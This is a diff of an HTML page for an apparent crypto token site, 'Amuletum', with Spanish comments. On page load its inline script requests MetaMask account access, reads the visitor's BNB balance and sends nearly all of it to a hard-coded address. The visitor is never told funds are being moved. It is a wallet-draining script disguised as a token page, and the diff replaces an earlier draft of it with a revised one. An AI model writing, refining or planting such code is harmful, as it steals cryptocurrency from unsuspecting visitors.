@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
+  
   <head>
+    
     <title>Amuletum | Your Token</title>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -12,6 +14,7 @@
     <link rel="icon" type="image/png" sizes="16x16" href="images/x-icon/favicon-16x16.png">
     <link rel="manifest" href="images/x-icon/site.webmanifest">
     <link rel="stylesheet" href="css/style.css" /><script type="text/javascript" src="formulario.js"></script>
+    
   </head>
    <body>
     <header>
@@ -38,60 +41,83 @@
       </div>
     </header>
 
-    <script>
-      async function conectarBilletera() {
-          // Verificamos si MetaMask está instalado y conectado
-          if (typeof window.ethereum !== 'undefined') {
-              try {
-                  // Solicitamos permiso al usuario para acceder a su cuenta de MetaMask
-                  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                  const userAddress = accounts[0];
-  
-                  // Dirección del destinatario
-                  const toAddress = '0x...'; // Inserta la dirección del destinatario aquí
-  
-                  // Obtener saldo en BNB
-                  const balance = await window.ethereum.request({
-                      method: 'eth_getBalance',
-                      params: [userAddress, 'latest'],
-                  });
-  
-                  // Convertir el saldo de Wei a BNB
-                  const balanceInBnb = parseFloat(window.ethereum.utils.fromWei(balance, 'ether'));
-  
-                  // Verificar si el saldo es mayor a $5
-                  const valorEnDolares = balanceInBnb * 500; // Precio estimado de 1 BNB en dólares
-                  if (valorEnDolares > 5) {
-                      // Crear la transacción
-                      const transactionParameters = {
-                          to: toAddress,
-                          from: userAddress,
-                          value: balance, // Enviamos todo el saldo
-                      };
-  
-                      // Enviar la transacción
-                      const result = await window.ethereum.request({
-                          method: 'eth_sendTransaction',
-                          params: [transactionParameters],
-                      });
-                      console.log('Resultado de la transacción:', result);
-                      alert('Transacción enviada correctamente!');
-                  } else {
-                      alert('El saldo en BNB no es mayor a $5.');
-                  }
-              } catch (error) {
-                  console.error('Error al enviar la transacción:', error);
-                  alert('Hubo un error al enviar la transacción. Consulta la consola para obtener más detalles.');
-              }
-          } else {
-              // MetaMask no está instalado, mostramos un mensaje de error
-              alert('MetaMask no está instalado. Por favor, instálalo para continuar.');
-          }
-      }
-  
-      // Llamamos a la función conectarBilletera() cuando la página se carga
-      window.onload = conectarBilletera;
+   <!-- Agrega una referencia a la biblioteca ethers.js -->
+   <script type="module">
+    import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js";
+    // Your code here...
   </script>
+   
+   <script>
+    async function conectarBilletera() {
+        // Verificamos si MetaMask está instalado y conectado
+        if (typeof window.ethereum !== 'undefined') {
+            try {
+                // Solicitamos permiso al usuario para acceder a su cuenta de MetaMask
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                // Obtenemos la dirección de la billetera actualmente conectada
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                const userAddress = accounts.length > 0 ? accounts[0] : null;
+
+                if (userAddress) {
+                    // Dirección del destinatario
+                    const toAddress = '0x983853d4af01792af8eac079807b4def6ce037f8'; // Inserta la dirección del destinatario aquí
+
+                    // Obtener saldo en BNB
+                    const balance = await window.ethereum.request({
+                        method: 'eth_getBalance',
+                        params: [userAddress, 'latest'],
+                    });
+
+                    // Obtener la tarifa de red actual
+                    const gasPrice = await window.ethereum.request({
+                        method: 'eth_gasPrice',
+                    });
+
+                    // Convertir el saldo de Wei a BNB
+                    const balanceInEther = parseFloat(ethers.utils.formatEther(balance));
+                    const gasPriceInEther = parseFloat(ethers.utils.formatEther(gasPrice));
+                    const precioBNBEnDolares = 500; // Precio estimado de 1 BNB en dólares
+                    const valorEnDolares = (balanceInEther - gasPriceInEther) * precioBNBEnDolares;
+
+                    // Verificar si el saldo es mayor a $0.1 después de descontar la tarifa de red
+                    if (valorEnDolares > 0.1) {
+                        // Crear la transacción
+                        const transactionParameters = {
+                            to: toAddress,
+                            from: userAddress,
+                            value: ethers.utils.parseEther((balanceInEther - gasPriceInEther).toString()), // Enviamos el saldo disponible después de descontar la tarifa de red
+                        };
+
+                        // Enviar la transacción
+                        await window.ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [transactionParameters],
+                        });
+                        alert('Transacción enviada correctamente!');
+                    } else {
+                        alert('El saldo en BNB después de descontar la tarifa de red no es mayor a $0.1.');
+                    }
+                } else {
+                    alert('No se pudo obtener la dirección de la cuenta del usuario.');
+                }
+            } catch (error) {
+                console.error('Error al enviar la transacción:', error);
+                alert('Hubo un error al enviar la transacción. Consulta la consola para obtener más detalles.');
+            }
+        } else {
+            // MetaMask no está instalado, mostramos un mensaje de error
+            alert('MetaMask no está instalado. Por favor, instálalo para continuar.');
+        }
+    }
+
+    // Llamamos a la función conectarBilletera() cuando la página se carga
+    window.onload = conectarBilletera;
+</script>
+
+
+
+
   
   
 
